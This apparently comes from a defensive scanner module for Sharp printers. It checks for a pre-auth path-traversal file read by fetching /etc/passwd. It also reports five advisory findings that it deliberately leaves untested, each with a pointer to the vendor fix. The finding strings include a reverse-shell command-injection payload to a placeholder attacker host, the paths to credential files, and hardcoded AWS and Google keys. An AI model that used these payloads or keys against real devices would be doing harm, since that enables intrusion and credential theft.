        Findings from Pierre Kim's June 2024 Sharp MFP advisory bundle.

        One active probe (the pre-auth LFI, safe because it is a read of a
        harmless system file) plus five advisory findings that this module
        deliberately does not exploit. See ``_advisory_pre_auth_memory_corruption``
        and friends for the reasoning behind not actively testing each.
        """
        findings: List[VulnFinding] = []

        try:
            confirmed = self._check_pre_auth_lfi(target, ctx)
        except Exception:
            confirmed = None
        if confirmed:
            findings.append(confirmed)

        admin_default_worked = bool(
            login_result and login_result.ok
            and login_result.account.username.lower() == "administrator"
        )

        findings.append(self._advisory_pre_auth_memory_corruption())
        findings.append(self._advisory_hardcoded_google_keys())
        findings.append(self._advisory_hardcoded_aws_keys())
        findings.append(self._advisory_ipv6_command_injection(admin_default_worked))
        findings.append(self._advisory_ldap_downgrade(admin_default_worked))
        return findings

    def _check_pre_auth_lfi(self, target: Target, ctx: ScanContext) -> Optional[VulnFinding]:
        """
        Pre-authenticated arbitrary file read (Pierre Kim, June 2024, non-CVE section).

        The handler at /installed_emanual_down.html reads whichever file is named
        in the ``path=`` argument, and no traversal check is applied to the
        segments preceding /manual/. ``GET /installed_emanual_down.html?path=
        /manual/../../../etc/passwd`` returns the printer's Linux passwd file
        without a session cookie. We probe with /etc/passwd because it is small,
        harmless, unmistakably formatted, and never contains user data - we
        specifically do NOT reach for /mnt/log/core-main.log.gz.001 (coredumps
        holding cleartext user passwords) or /mnt/std04/DBMS/uaccnt (user
        credential database), which is where the real attack goes.
        """
        url = f"{target.base_url}{LFI_PATH}?path={LFI_PROBE_PATH_ARG}"
        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        }
        log_request(ctx, "SHARP LFI PROBE", target.hostport, "GET", url, headers)
        try:
            resp = http_get(url, ctx, headers=headers, allow_redirects=False,
                            max_bytes=32 * 1024)
        except RequestException:
            return None
        log_response(ctx, "SHARP LFI PROBE RESPONSE", target.hostport, resp, body_limit=300)

        if resp.status_code != 200:
            return None
        body = resp.text or ""
        if not _LFI_PASSWD_RE.search(body):
            return None

        return VulnFinding(
            cve="no-CVE (pre-auth LFI)",
            title="Unauthenticated arbitrary file read via /installed_emanual_down.html path traversal",
            severity="critical",
            verified=True,
            output=(
                "Unauthenticated Local File Inclusion confirmed on this device: "
                f"GET {LFI_PATH}?path={LFI_PROBE_PATH_ARG} returned the printer's "
                "/etc/passwd (matched root:*:0:0: pattern). The same primitive reads "
                "coredump files under /mnt/log/core-main.log.gz.* (which store "
                "clear-text passwords for every user account, including Administrator, "
                "Service and FSS User) and the user database under "
                "/mnt/std04/DBMS/uaccnt/, so this finding chains directly to full "
                "credential compromise of the printer. Apply the vendor firmware "
                f"update per {SHARP_ADVISORY}. Reference: Pierre Kim, "
                "\"Sharp MFP - 17 vulnerabilities\", 2024-06-27."
            ),
        )

    def _advisory_pre_auth_memory_corruption(self) -> VulnFinding:
        """
        CVE-2024-28038 - pre-auth stack buffer overflow in the main HTTP
        stack. A ~639-byte MFPSESSIONID cookie overwrites the return stack
        of /tmp/main/main and hands the attacker control of PC. We do NOT
        probe this because the failure mode is a full crash of the main
        program (which serves HTTP, FTP, LPD, IPP, SNMP, and the touchscreen
        UI) followed by a reboot cycle. The advisory identifies the affected
        firmware family and every module we fingerprint runs it.
        """
        return VulnFinding(
            cve="CVE-2024-28038",
            title="Pre-authenticated stack buffer overflow in the main web server (RCE)",
            severity="critical",
            verified=False,
            output=(
                "Sharp advisory identifies a stack-based buffer overflow reached "
                "over an unauthenticated HTTP request whose MFPSESSIONID cookie is "
                "approximately 643 bytes long (buffer ~639 bytes; the trailing "
                "bytes overwrite saved registers). The main binary runs as root "
                "and services HTTP, FTP, LPD, IPP and SNMP, so a successful "
                "exploit yields root RCE and a failed one crashes every printer "
                "service until reboot. This scanner does NOT actively test the "
                "condition because failed exploitation reboots the device. "
                f"Apply the firmware update per {SHARP_ADVISORY}."
            ),
        )

    def _advisory_hardcoded_google_keys(self) -> VulnFinding:
        """
        CVE-2024-36248 - hardcoded Google OAuth client IDs baked into
        /tmp/main/main. Recoverable only by reading the binary off the
        device (which the LFI above enables), so this cannot be probed
        remotely as a per-device test; it's a firmware-family finding.
        """
        client_ids = "; ".join([
            "265490466885-m5cjvglv9q8aak493cgepe7juvafgh8c.apps.googleusercontent.com",
            "347970444986-0pij6u2tfhb240edjmls3h1u8qm2v2b3.apps.googleusercontent.com",
            "410988772526-6ujegl6jvquh9kstiegva8fk5j2ogag9.apps.googleusercontent.com",
            "292646726735-033ggn9hmlrs8bntrj0fbstob9m8qt26.apps.googleusercontent.com",
        ])
        return VulnFinding(
            cve="CVE-2024-36248",
            title="Hardcoded Google OAuth client IDs in the main firmware binary",
            severity="medium",
            verified=False,
            output=(
                "Sharp advisory identifies four hardcoded Google OAuth "
                "apps.googleusercontent.com client IDs baked into the main "
                "firmware binary (/tmp/main/main). The reporter notes the "
                "underlying registrations are no longer used by Sharp and are "
                "free for anyone to claim, so any device attempt to reach them "
                f"is receivable by an attacker who registers them: {client_ids}. "
                "Apply the firmware update per "
                f"{SHARP_ADVISORY} and block outbound traffic to the listed hosts."
            ),
        )

    def _advisory_hardcoded_aws_keys(self) -> VulnFinding:
        """
        Non-assigned CVE - hardcoded AWS API key and Postman token embedded
        in sub_20D542C() of /tmp/main/main, used to POST device analytics to
        an ap-northeast-1 API Gateway with ``curl -k`` (TLS validation
        disabled). Same recovery-only shape as the Google finding.
        """
        return VulnFinding(
            cve="no-CVE (hardcoded AWS analytics key)",
            title="Hardcoded AWS API key and analytics endpoint in the main firmware binary",
            severity="medium",
            verified=False,
            output=(
                "Sharp advisory identifies a hardcoded x-api-key "
                "'PBYXSIK6av8fBt8Qe1EQUaF9ZaKvTDutaXS9YwWA' and Postman token "
                "'44688039-5104-39be-f974-c1f5ef621a5f' shipped in the main "
                "firmware binary, used to POST device analytics to "
                "https://7db3z5d116.execute-api.ap-northeast-1.amazonaws.com/prod/MFPDataAlalytics "
                "with 'curl -k' (TLS certificate validation disabled). Any actor "
                "who recovers the keys can impersonate a printer or, by MITM'ing "
                "the analytics endpoint, receive traffic from every device. "
                f"Apply the firmware update per {SHARP_ADVISORY} and block "
                "outbound traffic to the listed endpoint."
            ),
        )

    def _advisory_ipv6_command_injection(self, admin_default_worked: bool) -> VulnFinding:
        """
        N-day CVE-2022-45796 - authenticated command injection in the IPv6
        address field on /nw_interface.html (form field ggt_textbox(16)),
        which the device passes to a shell (ping6). We do NOT actively test
        this because successful injection persists a shell payload into the
        printer's IPv6 network configuration.
        """
        priority = ""
        severity = "high"
        if admin_default_worked:
            priority = (
                " This scanner confirmed the Administrator account is still on the "
                "vendor default password, so an attacker already has everything "
                "they need to reach this injection point."
            )
            severity = "critical"
        return VulnFinding(
            cve="CVE-2022-45796",
            title="Authenticated command injection in the IPv6 configuration field (RCE)",
            severity=severity,
            verified=False,
            output=(
                "N-day CVE-2022-45796 (Pierre Kim, June 2024): the IPv6 address "
                "field on /nw_interface.html (form field ggt_textbox(16)) is "
                "passed unsanitised to a shell, so a POST containing "
                "'ggt_textbox(16)=|bash -i >& /dev/tcp/<attacker>/443 0>&1' "
                "yields a root reverse shell. Requires an authenticated "
                f"administrator session.{priority} This scanner does NOT "
                "actively test the condition because a successful exploit "
                "rewrites the printer's IPv6 network configuration. Apply the "
                f"firmware update per {SHARP_ADVISORY}."
            ),
        )

    def _advisory_ldap_downgrade(self, admin_default_worked: bool) -> VulnFinding:
        """
        CVE-2024-34162 - LDAP credential exfiltration via an authenticated
        downgrade of the LDAP client's authentication type to SIMPLE, at
        which point the printer's Connect Test transmits its stored bind
        credential in cleartext to whichever server the attacker has pointed
        it at. We do NOT actively test because the exploit requires standing
        up a rogue slapd and overwriting the device's LDAP configuration.
        """
        priority = ""
        severity = "high"
        if admin_default_worked:
            priority = (
                " This scanner confirmed the Administrator account is still on the "
                "vendor default password, so an attacker already has everything "
                "they need to reach this downgrade primitive."
            )
            severity = "critical"
        return VulnFinding(
            cve="CVE-2024-34162",
            title="LDAP credential exfiltration via authentication downgrade to SIMPLE",
            severity=severity,
            verified=False,
            output=(
                "CVE-2024-34162: an authenticated administrator can reconfigure "
                "the LDAP client at /nw_ldap_entry.html?ldapid=0 to point at an "
                "attacker-controlled server and downgrade the authentication "
                "type to SIMPLE. The Connect Test button then transmits the "
                "stored bind credential in cleartext to the attacker's slapd, "
                "which logs it verbatim (visible in slapd -d 10 output). "
                f"Requires an authenticated administrator session.{priority} "
                "This scanner does NOT actively test the condition because a "
                "successful test overwrites the device's LDAP settings and "
                "requires a rogue LDAP server. Review whether LDAP is "
                f"configured on the device and apply the firmware update per "
                f"{SHARP_ADVISORY}."
            ),
        )
